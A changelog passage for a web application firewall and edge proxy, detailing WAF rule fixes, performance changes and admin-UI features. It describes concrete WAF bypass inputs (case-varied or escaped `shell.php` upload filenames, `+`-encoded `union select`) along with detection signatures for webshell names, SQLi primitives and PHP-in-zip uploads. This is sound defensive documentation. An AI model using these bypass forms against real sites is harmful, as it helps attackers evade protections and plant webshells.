  so `FileName="shell.php"` (capital `N`), `FILENAME=`, `fileName=` were honoured
  by the backend yet matched none of the patterns, so `bad_fname` never ran and
  **every** extension matcher was skipped. (2) The RFC 5987 / 6266 extended
  parameter `filename*=charset'lang'pct-value` (honoured by ASP.NET/IIS
  `FileNameStar`) was not matched at all. (3)/(4) PHP's `php_ap_getword_conf`
  (shared by cPanel/LiteSpeed lsphp) honours a `\"` escaped quote and even an
  UNTERMINATED opening quote, so `filename="shell\".php"` and `filename="shell.php`
  <CRLF> delivered a `.php` the precise `"([^"]+)"` patterns under-read. Fixes:
  the token is matched case-insensitively; a dedicated `filename*=` loop strips
  the `charset'lang'` prefix and percent-decodes once (mirroring the server); and
  an end-of-Content-Disposition-line backstop hands the whole value to the
  anchored extension matchers when the precise quote patterns miss. Verified
  old-vs-current: the shipped code missed all four bypass classes; the fix blocks
  them while leaving benign uploads untouched — a legit `filename*=…holiday%20`
  `photo.jpg`, a field literally named `filename`, and the anchoring FP fixes
  (`vendor.jspdf.min.js`, `company.pharma.pdf`) still pass, since the backstop
  relies on the same leading-dot + `[^%w]`/`$` anchoring. Found by two adversarial
  review passes over the rule-401 extension-anchoring fix.
- WAF (rule 401, `WAF_UPLOAD_FNAME`, block + autoblock): **fixed unanchored
  upload-extension matchers that banned legitimate uploaders.** The
  server-side-handler extensions `.phar` `.asp[x]` `.asa[x]` `.asmx` `.ascx`
  `.jsp[x]` `.cer` `.cdx` were matched as bare substrings
  (`fname:match("%.phar")` …), so a benign filename that merely *contained* one
  mid-word tripped the rule — `.phar`⊂`company.pharma.pdf`,
  `.asp`⊂`trip.aspen.jpg`, `.asa`⊂`team.asana.csv`, `.jsp`⊂`vendor.jspdf.min.js`
  (a very common library bundle), `.cer`⊂`vase.ceramic.jpg`. Because rule 401 is
  block **and** autoblock-armed, that was a hard 403 **plus a 6h nftables IP
  ban** of a real customer. They are now anchored exactly like the adjacent
  `.php`/`.phtml`/`.pht` matchers — `%.EXT[^%w]` (a further `.ext`/separator) or
  `%.EXT$` (end) — so a real trailing extension and the `shell.asp.jpg`
  double-extension are still caught while the mid-word substring is not. The
  `.cer[^t]` guard (which kept `.cert` out) is subsumed by `[^%w]`. Verified by
  an old-vs-current comparison: the anchored rule blocks the **identical** set
  of malicious uploads (15/15, incl. trailing-space/dot/`::$DATA`/NUL/tab and
  double-extension evasions) while no longer false-positive-banning five
  classes of benign file. Found by the 2026-07 edge Lua audit.
- WAF (rule 301, `WAF_SQLI`, block): **closed a first-try block-tier SQLi
  bypass via `+`-encoded spaces.** The tautology signatures (`union select`,
  ` or 1=1`, `' or '1'='1`) were matched against the scan string with `+`
  preserved (`sc`), while a browser/form sends a space as `+` and PHP
  (`parse_str`/`$_GET`/`$_POST`) decodes `+`→space before the SQL runs — so
  `?id=1+union+select+…` reached the database as `1 union select` yet evaded
  the WAF, even though the `%20`/literal-space forms were caught. These
  tokens now match against the `+`/whitespace-collapsed scan string (`scw`),
  which also folds double separators (`union%20%20select`, `union++select`)
  that a single-space substring test missed. `UNION SELECT` additionally
  gained a value-terminator guard — a **digit, quote, or close-paren** (or
  string start) immediately before `union` — so that collapsing `+`→space
  does not turn the signature into a bare two-word substring that would block
  legitimate English where "union" is a noun (`credit union select account`,
  `trade union selection`, `european union select committee`) at block tier;
  real UNION injection breaks out of an existing value first and the common
  `?id=1+union+select` form carries the value's trailing **digit** as that
  terminator. `=`, `/` and `,` are deliberately excluded from the class to
  avoid FPs on value-leading nouns (`?q=union+select+board` "Union Select
  Board", `?q=union+selectmen`), legit paths (`/union+selected+news`) and CSV
  values — at the cost of the rare bare-value `?id=union+select` form. SQL
  keyword-literal operands (`null`/`true`/`false`) also break out of an
  unquoted value without a digit/quote/paren (`?id=null+union+select`,
  `?enabled=true+union+select`, `1 is null union select`) and end in a letter,
  so they are matched explicitly — the shipped substring check caught these, so
  the terminator gate would have regressed on them. `' or '1'='1` (quoted) and
  ` or 1=1` (leading space) are FP-safe on the collapsed string as-is; the
  `%`-encoded fallbacks and the `+`-literal `=0+0+0+1` tail are untouched. Regression + FP-negative tests added to
  `cfm_waf_sqli_test.lua`, each verified to fail on the pre-fix/pre-guard
  forms. Scope note: this closes the `+`-encoding bypass of the existing
  adjacent-`union select` signature only; the pre-existing keyword/separator
  evasions (`union all select`, `union distinct select`, `union(select`,
  `union/**/select`) remain and are tracked for a dedicated,
  FP-burn-in'd rewrite. Found by the 2026-07 edge Lua audit.

### Added
- Edge proxy: **opt-in origin keepalive** (`detectors.conf [webdetector]
  ORIGIN_KEEPALIVE = 1` — the single switch, published to the edge via
  `cfm_bridge_config.lua` and picked up within ~10s, no proxy reload) —
  allow-traffic routes through new `cfm_origin_http`/`cfm_origin_https`
  upstream pools (`configs/lua/cfm_origin_ka.lua`, balancer_by_lua) instead
  of opening a fresh TCP connection — plus a full upstream TLS handshake on
  443 — to Apache for every request. Safety: routing engages only when the
  live proxy conf declares the pools (`$cfm_origin_ka_conf` sentinel in the
  current `openresty.conf`/`angie.conf`), so arming the knob against an
  older live conf is a no-op rather than a 502 storm. Port 80 is always
  pooled (Host-header vhost routing); port 443 is pooled only when
  lua-resty-core supports SNI-keyed pools (OpenResty 1.27.1.1+), otherwise
  it falls back to per-request connections so a connection handshaked for
  one SNI is never reused for another vhost (no Apache 421s on shared
  boxes); an engine build without balancer-keepalive FFI support (possible
  on some Angie module builds) degrades once-per-worker to per-request
  connections with a WARN instead of erroring. Keepalive races are covered:
  one `set_more_tries(1)` retry per request replaces the default upstream
  retry that balancer_by_lua disables. Tunables: `ORIGIN_KEEPALIVE_IDLE_SEC`
  (default 3, keep below Apache `KeepAliveTimeout`, clamped 1-60),
  `ORIGIN_KEEPALIVE_MAX_REQS` (default 1000). Default OFF — zero behaviour
  change until an operator opts in. See `docs/proxy-performance.md` for the
  measurement + rollout recipe.
- Edge proxy: **client TLS session resumption** — `ssl_session_cache
  shared:cfm_ssl:20m` + `ssl_session_timeout 4h` at the `http {}` level of
  both engine configs (panel listeners inherit). Reconnecting clients
  (mobile especially) skip the full TLS handshake; previously no session
  cache was configured at all.
- Edge proxy: **latency-split instrumentation** in the `cfm` access-log
  format: `uct=` (`$upstream_connect_time` — TCP+TLS to Apache, the number
  origin keepalive collapses), `uht=` (`$upstream_header_time`), `sslr=`
  (`$ssl_session_reused` — client resumption ratio), and `luams=`
  (`$cfm_lua_ms`, new per-request variable stamped by cfm.lua with the
  access-phase wall-clock ms on origin-allow paths). Lets operators split
  the CFM hop into handshake / Lua / backend without guesswork.

### Fixed
- Edge proxy (cfm.lua): **eliminated 4–5 `loadfile()` disk reads per
  request.** The self-ips and ignore-nets caches carried 30s TTLs but their
  state lived in top-level locals, which re-initialise on every request
  under `access_by_lua_file` (the documented PITFALL), so the TTL check was
  a permanent miss; the bridge token, bridge config and clamav-toggle files
  were additionally `loadfile()`'d unconditionally per request. All five now
  go through `configs/lua/cfm_filecache.lua`, a require'd per-worker TTL
  cache (token/configs: 10s TTL; self-ips/ignore-nets: their existing 30s /
  2s-when-missing TTLs — now actually honoured). Behaviour is unchanged
  apart from the disk probes happening once per TTL window instead of once
  per request.
- Edge proxy (cfm_panel.lua): the panel listeners' bridge-config read had
  the same per-request `loadfile()` bug **and** was a second, drift-prone
  copy of the parse; it now goes through the canonical
  `cfm_bridge_cfg.lua` accessor (same 10s TTL as the main edge), so panel
  ports pick up daemon knob changes identically to web listeners.
- Edge proxy: **one bridge-token loader for the whole edge.**
  `cfm_bridge_cfg.token()` (cfm_filecache-backed, 10s TTL / 2s
  missing-retry) replaces four private load+validate copies: cfm.lua,
  cfm_panel.lua (which also re-read the file once per panel request),
  cfm_purge.lua, and cfm_h3_config.lua — the latter cached the token
  **forever** per worker, so a daemon-side token rotation left the HTTP/3
  config fetch 403-ing against the bridge until an nginx reload; it now
  converges within 10s like every other consumer. The validity rule
  (string, ≥32 chars) lives in one place. cfm_purge — the one INBOUND
  validator (it checks the token the daemon presents) — refreshes-on-
  mismatch so a force-unblock issued right after a startup token rotation
  is never 403'd by the 10s cache. (cfm_panel's install-preflight selftest
  still probes the raw token file on purpose — it validates the file
  itself.)
- internal/sslcollector: the four generated-Lua writers (token,
  sslcollector config, clamav config, webdetector bridge config) now share
  one `writeLuaFileAtomic` implementation of the tmp-write → 0640 →
  root:cfm chown → rename sequence, so a future fix to the enforced
  ownership/mode path lands in all writers at once. Error strings and log
  tags are preserved per writer; the two config writers additionally gained
  the final-chmod hardening the token writer already had.
- API: **bulk IP block endpoint with self-lockout guard** — admin-only
  `POST /api/v1/firewall/block/batch` (`{ips: […], ttl, reason}`, ≤256 IPs per
  request, same TTL semantics as the single endpoint: empty = permanent). Each
  IP is reported individually (`blocked` / `skipped` / `failed`) and the batch
  **skips — never blocks — the server's own IPs** (loopback, link-local, any
  interface-bound address, re-enumerated per request) **and the calling
  admin's own IP** (first `X-Forwarded-For` hop when the daemon sits behind
  the edge proxy on loopback, else the connection address), so a bulk
  select-all can't firewall you out of your own box. Audit-logged to `api.log`
  (`[block.batch]` summary + one line per self/caller skip). The web UI's
  "Block selected (N)" now sends one batch request per 256-IP chunk instead
  of a client-side loop of single blocks: skipped IPs are named in the result
  toast and unselected, transient failures stay selected for retry.
- WebUI (`/cfm-admin` webdetector pages): **bulk IP selection + bulk block.**
  The Global Top IPs and vhost-drilldown Top IPs tables now have a checkbox per
  row plus a select-all header checkbox, and clicking a row's **CC / ASN /
  company** value quick-selects every listed IP sharing it ("these 20 bots are
  all the same datacenter" in one click). A sticky action bar appears while
  anything is selected: **Block selected (N)** applies the page's Block TTL
  (including `permanent`, with a count-explicit confirmation) to all selected
  IPs, with live progress; failed IPs stay selected for retry and are named in
  the result toast. Selection deliberately survives auto-refresh and top-N
  rotation, so IPs picked during a bot storm stay picked while the list churns.
- WebUI (`/cfm-admin` webdetector pages): **selectable TTLs for the Block and
  Challenge actions** instead of the hardcoded 1h/30m. A **Block TTL** selector
  (`1h / 6h / 24h / 7d / permanent`) now drives every Block button on the page
  (Global Top IPs + vhost-drilldown Top IPs); **permanent** sends an empty TTL —
  an nft entry with no timeout, exactly like `cfm block <ip>` — and asks for
  confirmation first. A **Challenge TTL** selector (`30m / 1h / 2h / 6h / 24h`)
  drives the Challenge / Manual challenge buttons (`challenge/vhost/add`).
  Button labels and tooltips show the TTL that will be applied, and the action
  toast names it. No API change — both endpoints already accepted arbitrary
  TTLs; the UI just never exposed them.
- WebUI: the vhost-drilldown **Top IPs list is size-selectable (25 / 50 / 100)**
  — more rows to act on during a bot storm. The drilldown fetch now asks the
  server for its maximum (`top=100`) up front, so switching the selector never
  refetches. The waf/forensics/main pages previously hard-capped this list at
  12 rows; they now share the same selector (default 25).
- WAF → autoblock (**Phase 1**, ships DRY_RUN): a new **`waf_security`** detector
  turns the in-path WAF's per-hit stream into a persistent, cross-request
  **nftables** block via the shared detector framework — so a source that keeps
  tripping high-confidence WAF rules gets an L3/L4 ban that is queryable
  (`cfm which <ip>`), logged to `cfm.detectors.log`, reported to cfm-web, and
  emailed, instead of only being handled per-request at the edge. Wiring: a new
  `SubscribeWAFHitEvents` hook published from `Engine.RecordWAFTrigger` (the
  single per-hit choke point) feeding a per-IP-per-reason-family sliding-window
  counter. **Scoped to edge-`block` hits only** ("block at WAF → nft candidate"):
  the subscribe callback drops any hit whose edge action isn't `block`, so
  challenge/logonly hits never feed — this keys autoblock to what the WAF
  already blocked, rather than to a whole reason-family (a family such as
  `WAF_RCE` spans block rule 320 and logonly 322-327, and `WAF_BACKDOOR` has no
  block-tier rule at all). **Every WAF reason-family is a config knob** (key =
  family minus `WAF_`; the full ~40-family registry is covered automatically and
  guarded by a coverage test), but only the four families with an edge-`block`
  rule — `SQLI`, `RCE`, `UPLOAD_FNAME`, `UPLOAD_CONTENT` — can actually autoblock
  in Phase 1 and default to threshold 1; `BACKDOOR` is armed to 1 for when one
  of its rules is promoted to block. Every challenge/logonly family defaults to
  `0` and is inert until Phase 2. Per-rule-id overrides (`RULE_<id>`) win over
  the family threshold.
  Ships enforcing a **soft TTL block** (`BLOCK = "6h"`, self-healing) rather
  than a permanent ban; `DRY_RUN = 1` is available for a watch-first burn-in.
  `[waf_security.leniency]` gives GR/CY a 15m temp-ban + API + lenient blocklist
  instead of a farm-wide ban. Config in `configs/detectors.conf`; design in
  `docs/waf-autoblock-design.md`.

### Changed
- Challenge: **audit trail when an exclude suppresses a vhost challenge.** When
  the suspicious-vhost scorer WOULD flag a host but it is in the Challenge
  excludes, CFM now logs `[challenge][vhost] action=suppressed_by_exclude
  host=… would_reason=… uniqIP=… reasons=… note=host_in_challenge_excludes`
  (throttled to once per holddown window). This is the deliberate paper trail:
  an operator who excludes a host — or turns Challenge/WAF off for it at a
  customer's request — can show exactly what protection was declined ("we would
  have challenged N unique IPs on this vhost, but it's excluded") if that host
  later gets crawled/scraped. Also **relabelled the `CHALLENGE_VHOST` config-list
  push reason `manual` → `vhost_config`** in the challenge log: those pushes come
  from the config list every reconcile, not a human, and the `manual` label read
  as an operator having clicked it. A **genuine** operator/API manual challenge
  (from the `manualChal` store) still emits `reason=manual` — only the config-list
  push was relabelled — and the separate per-request manual/auto classification
  (`manual_active`) is unaffected.
- ClamAV upload scan: **only scan uploads the WAF let through** — the edge
  (`cfm.lua`) no longer fires `clamav.notify` on a request the WAF is about to
  **block** (`waf_action == "block"`). A WAF block already stops the malware at
  the edge, so scanning the same payload wasted ClamAV resources and produced a
  redundant infected-upload notification; the scan's value is the **rule-gap
  insight** (and alert) when a malicious upload slips *past* the WAF. Uploads
  that pass clean, or hit only a `logonly`/`challenge` rule, or arrive with the
  WAF failing to load (not-run, the module-load fallback), are still scanned
  exactly as before. No config change. **Deliberate tradeoff:** skipping the
  scan on WAF-blocked uploads also drops, for those requests, the infected-upload
  email as a compromised-account signal and the ClamAV-clean "second opinion"
  used to exonerate a WAF false-positive block — accepted, since a WAF block
  already stopped the payload and the scan's value is the pass-through rule-gap
  case.
- WAF: **split the encoded-`<?php` backdoor opener (rule 437) into two rule ids**
  — `rule_php_encoded_opener` (437, the URL/HTML-entity/JS-escape forms) and the
  new `rule_php_encoded_opener_b64` (438, the base64 `PD9waHA` form). One
  detector, routed by encoding. **Both stay at `challenge`; no behaviour change
  today** — this is an observability split so the two encodings can be tuned and
  measured independently. Rationale: the URL form is FP-prone (a browser
  url-encodes a user-typed `<?php` in any form field to `%3C%3Fphp`, so a legit
  blog comment / contact-form / paste POST fires it — `challenge` preserves and
  replays the POST, a hard `block` would 403 and drop it), whereas the base64
  form is attack-only (a browser never base64-encodes a form field; a 2026-07
  six-server review found 16/16 base64 openers were botnet POSTs of base64
  `<?php` to `/xmlrpc.php`, 0 FP). Rule 438 is the candidate for `block` after a
  1-2 week burn-in of the per-rule-id telemetry. **Operator note:** if you had
  customised `rule_php_encoded_opener` in `/etc/cfm/*` (a mode override, or a
  `--rule 437` per-vhost exclusion), it now covers only the URL/HTML/JS form —
  apply the same setting to `rule_php_encoded_opener_b64` / `--rule 438` for the
  base64 form. Also fixes a stale `DefaultMode` in `waf_rule_ids.go` (437 read
  `logonly` while the live Lua CFG had been `challenge` since 2026-06-25) and
  syncs `docs/waf.md` (the base64 `<?=`/`PD89` variant is intentionally *not*
  matched — the doc still listed it).

### Fixed
- Challenge: **dynamic "Challenge excludes" are now honoured by the vhost-wide
  challenge decision**, not only per-IP. The auto-suspicious-vhost scorer (and
  the `CHALLENGE_VHOST` list) previously consulted only the *static*
  `CHALLENGE_HOST_BYPASS` (`hostBypassed`), never the runtime UI/CLI/API exclude
  store (`MatchChallenge`, which is used only in the per-IP `isExcluded` path).
  So a host an operator explicitly excluded still got the **whole vhost**
  challenged the moment its suspicious score tripped, and adding the exclude did
  not clear an already-active auto-challenge (operator report: `www.gokids.gr`
  was excluded yet `auto_on reason=uniqip_on` challenged its visitors until the
  holddown expired). The dynamic exclude now wins over both the auto-suspicious
  path and the `CHALLENGE_VHOST` list, and clears any active vhost challenge on
  the next reconcile. Workaround on older builds: add the host to the static
  `CHALLENGE_HOST_BYPASS` (which the vhost path already honoured).
- Detectors: **`IGNORE_IPS`/`IGNORE_NETS` edge bypass no longer dies silently
  under a hardened daemon umask.** The Go mirror `WriteLuaCache` wrote
  `/var/lib/cfm/lua/cfm_ignore_nets.lua` with `os.WriteFile(…, 0640)`, whose
  perm arg is umask-filtered — so under a systemd `UMask=0077` service the file
  landed `0600`. The `cfm`-group OpenResty/Angie worker then could not read it,
  `loadfile()` returned nil (no panic, nothing logged), the ignore-nets ranges
  loaded empty, and `cfm.lua`'s `is_self_origin()` → Step 0a hard-bypass went
  **silently inert**: a request from the server's own `IGNORE_NETS` subnet was
  run through the full WAF/challenge instead of bypassing (operator hit it —
  own-subnet WordPress xmlrpc pingbacks got challenged despite `84.54.49.0/24`
  being in `IGNORE_NETS`). Now forces the mode with an explicit `os.Chmod(0640)`
  (umask-immune), matching `nft.writeSelfIPsLua` and the sslcollector snapshot
  writer, which already carried this guard. Regression test flips the process
  umask to `0077` and asserts the on-disk mode is still `0640`.
- Web detector: **the per-IP 403 flood counter (`IP403_COUNT` → `WEB/403`) now
  ignores static assets**, matching the sibling 404 and 40x-combo counters. It
  was the only 40x counter still counting `.jpg/.png/.gif/.css/.js/...` responses,
  so a customer legitimately browsing their **own** image-heavy WordPress/
  WooCommerce site self-blocked (`WEB/403`, TTL) when the **origin** (Apache/
  WordPress — hotlink protection, an origin security plugin, or broken Elementor
  thumbnails) returned 403 on many images: a single Elementor page fans out to
  dozens of asset requests, so hundreds of static-asset 403s crossed
  `IP403_COUNT` in minutes. Real 403-floods hit forbidden **non-static** paths
  (`wp-login`, `/.git`, config files), which still count. Regression tests added.
- WAF: **rule 611 (`WAF_BAD_UTF8`) no longer false-positives on raw binary
  uploads.** The detector already skipped `multipart/form-data` bodies, but the
  WordPress REST media endpoint (`POST /wp-json/wp/v2/media`) uploads a raw image
  with `Content-Type: image/jpeg` — not multipart — so the JPEG's bytes walked
  into the UTF-8 check and logged `UTF8_OVERLONG` on every legit media upload (a
  Greek admin on `mygreecetours.org` was hitting it repeatedly). The body walk is
  now gated on a *textual* content-type (`is_textual_body_content_type`), matching
  the sibling ctrl-chars (601) and webshell-body (404) detectors — so raw
  `image/*` / `application/octet-stream` / etc. bodies are skipped via any
  endpoint, while the urlencoded/JSON/XML overlong-slash bypass detection is
  unchanged. Rule 611 is `logonly`, so this was log noise, not a block. New test
  covers the raw `image/jpeg` case.
- ClamAV upload scan: **narrowed the resumed-POST scan exclusion to the
  challenge action only.** The replayed-POST follow-up excluded *every* resumed
  POST from `clamav.notify`, but only the `challenge` re-hit is force-blocked
  (`block_replayed`); a resumed POST whose hit degrades to `logonly` on replay
  (e.g. the original challenge came from a burst-window rule that is quiet by
  replay time while a logonly rule still matches) reaches origin and was
  slipping through **unscanned**. The gate now skips the scan only for
  `challenge`-action resumed POSTs, restoring the "scan everything the WAF lets
  through" invariant.
- Challenge: **`/.well-known/` requests no longer feed the log-driven per-IP
  challenge heuristics**, so a CA's ACME/DCV validator can't be mistaken for a
  scanner. A validator (e.g. Let's Encrypt / AutoSSL) legitimately hits many
  domains and many one-time token paths on a shared server, which tripped
  `CHALLENGE_UNIQHOSTS_IP` / `CHALLENGE_UNIQPATHS_IP` and challenge-flagged the
  validator IP. In OpenResty mode the in-path `/.well-known/` carve-out
  (`cfm.lua` Step 0a1) still served the token, but the flag polluted per-IP
  state; **in DNAT mode the flagged IP was redirected to the challenge server
  before the carve-out ran, so validation failed (`403 …acme:error:unauthorized`)
  and certificate issuance broke.** The webdetector now excludes the whole
  `/.well-known/` prefix from all challenge accounting (unique-hosts/paths,
  vhost unique-IP, RPS, 40x, …) — the decision-side mirror of the in-path
  carve-out. A `..` guard prevents `/.well-known/../` from escaping the
  exemption; normal-path scanners are unaffected.
- detectors config: **`detectors.conf` scalar settings with an inline
  `; comment` on the value line now take effect.** `kvInt`/`kvBool`/`kvDur`
  parsed the raw stored value, so `KEY = 5 ; note` became the string `"5 ; note"`,
  failed to parse, and silently fell back to the built-in default (only the
  string/float readers stripped inline comments). This masked several configured
  values. **Behaviour changes on deploy** (the configured values were written
  deliberately and now apply): the **health `/tmp` auto-cleanup activates**
  (`TMP_PCT = 85`, delete files older than `TMP_CLEAN_OLDER = 12h` when `/tmp`
  is ≥ 85% full — previously off because `TMP_PCT` read as 0); the
  **suspicious-vhost auto-challenge uses its configured thresholds** (fires at
  `UNIQIP_ON = 150` unique IPs instead of the code default 300, `MIN_UNIQIP`
  60 vs 80, `HOLDDOWN` 25m vs 10m — i.e. the intended, more aggressive tuning);
  and the `health` detector's `EVERY` is 20s (was falling back to 60s). Other
  inline-commented values were unaffected because the written value already
  equalled the default. If you do **not** want a given activation, set that key
  explicitly (e.g. `TMP_PCT = 0` to keep `/tmp` cleanup off). See CLAUDE.md §5.
  **Before rolling out**, grep your live `/etc/cfm/detectors.conf` for scalar
  lines carrying an inline `;`/`#` comment (`grep -nE '= *[^;#]*[^ ] +[;#]'`):
  those were silently using the default and will now take the written value.
  In particular a `mysql_governor` kill threshold written *below* its default
  with an inline comment (e.g. `LOCK_FANOUT_KILL = 5 ; aggressive`) would begin
  enforcing the tighter value — intended, but verify it's what you want.

### Security
- WAF: **new rule 414 (`rule_upload_archive_php`) blocks a PHP webshell hidden
  inside an uploaded `.zip`.** Traced to a 2026-07 Joomla mass-defacement
  ("ANTONKILL") that landed shells via `com_sppagebuilder&task=asset.uploadCustomIcon`
  uploading `ico*.zip`: the existing upload rules missed it because the outer
  multipart filename is `.zip` (401 allows it) and the `<?php` bytes are
  DEFLATE-compressed inside the archive (402's literal-tag scan can't see them);
  ClamAV extracted and scanned but the payload was obfuscated (`result=clean`).
  The new detector scans the multipart body for ZIP **local file headers**
  (`PK\3\4`) **and central-directory headers** (`PK\1\2` — the name PHP's
  `ZipArchive::extractTo` actually writes, defeating a benign-local/malicious-central
  name mismatch) and flags any entry whose cleartext name is PHP-executable
  (`.php`/`.php[3-8]`/`.phtml`/`.pht`/`.phar`/`.phps`) or a handler-override
  (`.htaccess`/`.user.ini`). Obfuscation-proof: it keys on the archive **entry
  name**, never the (compressed) content. Emitted under the **`WAF_UPLOAD_FNAME`
  family** (rule 414) so it inherits that family's `block` enforcement and
  `waf_security` autoblock intent — a php-in-zip on an asset endpoint is a
  webshell upload. **Scoped, provably, to Joomla** (`is_php_hostile_asset_upload`):
  a match requires BOTH `option=com_<component>` AND `task=asset.upload*`, each
  anchored to a query-param boundary. `option=com_` is a Joomla-only routing
  param, so WordPress (`action=`), OpenCart (`route=`), Magento, PrestaShop
  (`controller=`) and Drupal never match — which is what makes `block` safe with
  no cross-platform false positives. The whole plugin/theme/extension/backup
  ecosystem ships PHP-bearing `.zip` archives to installer/plugin endpoints, which
  are never matched; firing only on a Joomla asset (icon/image/font) upload, where
  a PHP-bearing archive is never legitimate, keeps them safe. Extend with a
  second, separately scoped clause as new non-Joomla vectors are confirmed. New
  test: `scripts/tests/cfm_waf_upload_archive_test.lua`.
- WAF: **split the webshell drop-path rule (410, `WAF_WEBSHELL`) into two
  confidence tiers and promoted the high-confidence half to `block`.** A
  6-server log review (mars/earth/titan/virgo/orion/rigel, ~256k WAF records)
  showed 6522 challenge-tier hits on this rule, almost all GET probes for known
  webshell drop-names. The proper-noun names with essentially zero legitimate
  use — `c99`/`c99shell`/`r57`/`r57shell`/`b374k`/`wso`/`wsoshell`/`ws0`/
  `webshell`/`minishell`/`p0wny`/`alfashell`/`indoxploit`/`aspxspy`/
  `aspxshell`/`jspspy`/`jshell` — now route to a **new block-tier rule 413
  (`rule_webshell_path_known`)**. The generic/ambiguous names that carry a
  residual false-positive tail — `adminer.php` (a real DB tool), `alfa.php`
  (the ALFA TEaM shell, but "alfa" is also a real word/brand), and short
  scratch-file names like `shell.php`/`x.php`/`1.php`/`cmd.jsp` — **stay at
  `challenge` on rule 410** (a legit page's visitors get a recoverable one-time
  challenge; a dropper is stopped).
  This mirrors the 437/438 split philosophy: never blanket-promote a family
  whose members span "always malicious" and "occasionally legitimate." Note
  `WAF_WEBSHELL` now has an edge-`block` rule (413), making it the **fifth**
  family eligible to drive `waf_security` autoblock in Phase 1 — but it is held
  at threshold **0** in **both the code default and the reference
  `detectors.conf`** (a deliberate exception to the "block-tier family arms to 1"
  rule), so the split adds **no** autoblock behaviour. This is intentional: a
  webshell GET-probe (`/c99.php`) is exactly what benign internet scanners
  (Shodan, Censys, uptime monitors, researchers) do, so auto-arming would nft-ban
  them fleet-wide. The edge still 403s the individual probe (harmless); an nft IP
  ban is a separate, deliberate opt-in (`WEBSHELL = 1`) after its own burn-in.
- WAF: the `WAF_BACKDOOR` content-heuristic rules **430 and 432 both stay at
  `logonly`** (neither is promoted). A promotion to `challenge` was considered
  and rejected after review: **432 (`rule_php_polyglot_full_body`)** — because
  `WAF_BACKDOOR` is a high-risk reason, a `challenge` here is converted to a
  **block** for a client holding a valid clearance cookie (`post_clearance_action`),
  and since the `BACKDOOR` family is autoblock-armed that converted block can earn
  a **6h nft ban of a logged-in customer** who uploads e.g. a PDF containing the
  literal string `<?php` via a raw-body endpoint — an unacceptable FP. **430
  (`rule_htaccess_poisoning`)** — because `AddType application/x-httpd-php` is a
  legitimate hand-written shared-hosting directive and the `addtype`/`sethandler`/
  `addhandler` branches are not prose-gated (only `.user.ini` is), so a
  forum/CMS post discussing it or a File-Manager `.htaccess` edit would trip it.
  Both promotions wait on their respective fixes (excluding post-clearance-
  converted hits from the autoblock feed; prose-gating the directive branches).
- WAF: **fixed silent `DefaultMode` drift in the Go rule mirror
  (`waf_rule_ids.go`).** Rules **410/411/412** (`rule_webshell_path`,
  `rule_webshell_ping`, `rule_polyglot_upload`) read `logonly` in the Go glossary
  while the live Lua CFG has run them at `challenge` — the same stale-metadata
  class as the 437 fix (the parity test checks id↔name, not mode, so it drifted
  unnoticed). The Go mirror now matches the live modes; this is glossary/CLI
  metadata only, no runtime behaviour change.
- WAF: **closed a webshell-upload bypass in the block-tier upload-filename rule
  (401, `WAF_UPLOAD_FNAME`).** `detect_upload_filename` blocked `.php`/`.php5`/
  `.phtml`/`.phar` (and `.jsp`/`.asp`/`.exe`/`.sh`/…) but missed the PHP
  alt-handlers `.pht` and `.phtm` that shared hosts commonly map to an
  interpreter, so a malicious multipart upload named `shell.pht` or `shell.phtm`
  reached origin. Those are **now matched** (including double-extension forms
  like `x.pht.jpg`), with the same block-tier enforcement and the narrow
  legit-PHP-upload endpoint carve-outs. **SSI pages (`.shtml`/`.shtm`) are
  deliberately NOT blocked** — they are a legitimate *static* file type on
  cPanel, and blocking them would false-positive on a customer uploading legit
  `.shtml` pages through a web file manager (and, since 401 is autoblock-armed,
  earn that customer a 6h IP ban); the SSI-exec risk is low (usually off via
  `IncludesNOEXEC`) and no `.shtml` appeared in captured upload samples.
  `.phps` (PHP source viewer) is likewise left out. New coverage test:
  `scripts/tests/cfm_waf_upload_fname_test.lua`.
- WAF: **promoted the SQLi families after a clean 6-server FP review** (2026-07,
  titan/virgo/orion/rigel/earth/mars): `rule_sqli` (301, `WAF_SQLI`)
  `challenge` → **`block`** (24/24 true positives, 0 FP — time-based/union/
  error-based sqlmap traffic against WP/PrestaShop/Fuel CMS), and
  `rule_sqli_blind_lexical` (309, `WAF_SQLI_LEXICAL`) `logonly` → **`challenge`**
  (188/188 TP, 0 FP — caught a distributed error-based `extractvalue()`/
  `floor(rand())` campaign the tier-1 tokens would have missed). Operators who
  pinned these in `/etc/cfm/*` keep their setting; only the shipped defaults
  change. `rule_superglobal_override` (318) stays `logonly` (0 hits observed).
- WAF: new rule **318** (`rule_superglobal_override`, `WAF_SUPERGLOBAL`,
  **`logonly`**) flags a request parameter whose **key** is a PHP superglobal /
  reserved name (`?_SERVER[x]=`, `&GLOBALS[x]=`, `_GET[x]=` in the body) — a
  PHP variable-poisoning attempt (`extract()` / `import_request_variables()` /
  register_globals patterns). Delimiter-anchored so ordinary fields like
  `db_server=` / `mail_server=` and superglobal-as-value (`?x=_SERVER`) do not
  match. First of the clean-room WAF additions from the NinjaFirewall gap
  analysis (`docs/waf-gap-analysis-ninjafirewall.md`); ships observe-only and
  is reviewed in the same WAF FP pass as the SQLi families.
- WAF: rule **301** (`rule_sqli`, `WAF_SQLI`) now catches the **time-based /
  boolean / error-based blind SQLi family** and **inspects the POST body**.
  Previously it scanned only `uri+args` with four narrow signatures
  (`union select`, `information_schema`, `or 1=1`, `' or '1'='1`), so a
  sqlmap scan against a form (a WHMCS ticket-submission flood was the trigger)
  sailed through — both because the payloads were body-borne and because the
  signatures missed `SLEEP`/`PG_SLEEP`/`WAITFOR DELAY`/`DBMS_PIPE` /
  `now()=sysdate()` / `=0+0+0+1`. Detection now covers those families across
  MySQL/PostgreSQL/MSSQL/Oracle/SQLite (whitespace/`+`-tolerant so
  form-urlencoded payloads still match) and runs over the body on POST.
  Detection is **split by false-positive risk**: DBMS-unique primitives
  (`pg_sleep`, `waitfor delay`, `dbms_pipe.receive_message`, `now()=sysdate()`,
  the `=0+0+0+1` boolean tail, …) stay on rule 301 at **`challenge`** (stops
  the bot; real browsers pass), while tokens that also collide with legitimate
  code/content (`benchmark(`, `extractvalue(`/`updatexml(` ≈ camelCase
  `extractValue(`/`updateXml(`, `floor(rand(`, `randomblob(`, `or sleep(` /
  `and sleep(`) ride a new rule **309** (`rule_sqli_blind_lexical`,
  `WAF_SQLI_LEXICAL`) at **`logonly`** — observed-only so a legitimate XML
  parser / updater / custom script can't be broken. Every captured WHMCS
  payload carries a tier-1 token, so the scan is fully challenged regardless.
  A 2-week FP review (before 2026-07-10) then decides promotion per tier — see
  `docs/waf.md` → "SQLi blind-family expansion".
